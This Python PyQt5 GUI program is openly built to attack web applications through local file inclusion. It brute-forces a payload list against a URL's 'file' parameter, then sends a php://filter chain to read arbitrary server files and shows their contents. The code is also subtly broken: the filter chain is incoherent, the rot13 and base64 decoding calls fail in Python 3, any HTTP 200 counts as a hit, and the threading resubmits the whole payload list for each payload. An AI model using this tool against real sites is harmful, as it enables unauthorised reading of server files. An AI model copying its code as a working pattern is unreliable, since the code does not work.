import sys
import requests
import concurrent.futures
import time
import os
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QPushButton, QLabel, QLineEdit, QTextEdit, QFileDialog, QMessageBox

class LFIVulnerabilityChecker(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('LFI Vulnerability Checker')
        self.setGeometry(100, 100, 800, 600)
        self.base_url_label = QLabel('Base URL:')
        self.base_url_input = QLineEdit()
        self.browse_button = QPushButton('Browse for Payload File')
        self.browse_button.clicked.connect(self.browse_payload_file)

        self.result_label = QLabel('Result:')
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)

        self.check_button = QPushButton('Check for Vulnerability')
        self.check_button.clicked.connect(self.check_vulnerability)

        layout = QVBoxLayout()
        input_layout = QVBoxLayout()
        input_layout.addWidget(self.base_url_label)
        input_layout.addWidget(self.base_url_input)
        input_layout.addWidget(self.browse_button)
        layout.addLayout(input_layout)
        layout.addWidget(self.result_label)
        layout.addWidget(self.result_text)
        layout.addWidget(self.check_button)

        self.setLayout(layout)

    def browse_payload_file(self):
        options = QFileDialog.Options()
        options |= QFileDialog.ReadOnly
        payload_file, _ = QFileDialog.getOpenFileName(self, 'Select Payload File', '', 'Text Files (*.txt);;All Files (*)', options=options)
        if payload_file:
            self.payload_file = payload_file

    def check_vulnerability(self):
        base_url = self.base_url_input.text()
        if not base_url:
            self.show_error_message("Please enter a base URL.")
            return

        if not hasattr(self, 'payload_file'):
            self.show_error_message("Please select a payload file.")
            return

        payloads = self.read_payloads(self.payload_file)
        result = self.check_concurrent(base_url, payloads)

        if result:
            self.result_text.clear()
            self.result_text.append(f"Vulnerable payload found: {result}")
            local_file_path = self.select_local_file()
            if local_file_path:
                lfi_response = self.exploit_lfi(base_url, local_file_path)
                if lfi_response:
                    self.result_text.append(f"Successfully exploited LFI. Content of the local file: \n{lfi_response}")
        else:
            self.show_error_message("No vulnerable payload found.")

    def show_error_message(self, message):
        error_dialog = QMessageBox(self)
        error_dialog.setIcon(QMessageBox.Critical)
        error_dialog.setText(message)
        error_dialog.setWindowTitle('Error')
        error_dialog.exec_()

    def read_payloads(self, file_path):
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]

    def check_lfi(self, url, payload):
        response = requests.get(url, params={'file': payload})
        return response.text

    def exploit_lfi(self, url, local_file_path):
        payload = f"php://filter/read=convert.base64-encode/resource=php://filter/read=string.rot13|convert.base64-decode/resource=php://filter/convert.base64-encode|php://filter/string.rot13=1/resource={local_file_path}"
        try:
            response = self.check_lfi(url, payload)
            if response:
                decoded_response = response.encode('utf-8').decode('rot13').encode('base64').decode('utf-8')
                return decoded_response
        except Exception as e:
            self.show_error_message(f"Failed to exploit LFI: {e}")
            return None

    def check_file_inclusion(self, url, payload):
        try:
            response = requests.get(url, params={'file': payload})
            if response.status_code == 200:
                return True
            else:
                return False
        except Exception as e:
            self.show_error_message(f"Failed to check for file inclusion: {e}")
            return False

    def check_payloads(self, url, payloads):
        for payload in payloads:
            if self.check_file_inclusion(url, payload):
                return payload
        return None

    def check_concurrent(self, url, payloads):
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = {executor.submit(self.check_payloads, url, payloads): payload for payload in payloads}
            for future in concurrent.futures.as_completed(futures):
                payload = futures[future]
                try:
                    result = future.result()
                    if result:
                        return result
                except Exception as e:
                    self.show_error_message(f"Failed to execute check_payloads: {e}")

    def select_local_file(self):
        options = QFileDialog.Options()
        options |= QFileDialog.ReadOnly
        local_file_path, _ = QFileDialog.getOpenFileName(self, 'Select Local File', '', 'All Files (*)', options=options)
        return local_file_path

def main():
    app = QApplication(sys.argv)
    lfi_checker = LFIVulnerabilityChecker()
    lfi_checker.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()
